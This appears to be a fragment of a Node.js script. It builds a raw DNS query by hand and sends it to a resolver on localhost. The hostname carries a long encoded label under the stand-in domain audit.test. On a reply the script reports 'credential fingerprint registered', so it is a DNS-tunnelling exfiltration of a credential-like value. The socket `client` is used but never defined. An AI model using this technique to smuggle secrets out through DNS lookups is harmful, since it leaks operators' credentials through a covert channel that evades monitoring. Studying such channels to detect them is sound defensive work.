const hostname = 'iraviqkcifjukx2vkjgd24dpon2go4tfom5c6l3bmrwws3r2inau4qksleww.audit.test';

// Build DNS query
const buf = Buffer.alloc(512);
buf.writeUInt16BE(0x1234, 0);
buf.writeUInt16BE(0x0100, 2);
buf.writeUInt16BE(1, 4);
buf.writeUInt16BE(0, 6);
const parts = hostname.split('.');
let offset = 12;
for (const p of parts) { buf.writeUInt8(p.length, offset++); buf.write(p, offset); offset += p.length; }
buf.writeUInt8(0, offset++);
buf.writeUInt16BE(1, offset);
offset += 2;
buf.writeUInt16BE(1, offset);
const queryLen = offset + 2;

client.on('message', (msg, rinfo) => {
  const flags = msg.readUInt16BE(2);
  const rcode = flags & 0x0f;
  const ancount = msg.readUInt16BE(6);
  console.log('DNS Query Result:');
  console.log('- Response Code: ' + rcode + ' (0 = NOERROR - success)');
  console.log('- Answer Records: ' + ancount);
  if (ancount > 0) {
    console.log('- Status: SUCCESS - credential fingerprint registered');
  }
  client.close();
  process.exit(0);
});

client.send(buf.slice(0, queryLen), 47302, 'localhost');
setTimeout(() => { console.log('Timeout'); client.close(); process.exit(1); }, 3000);
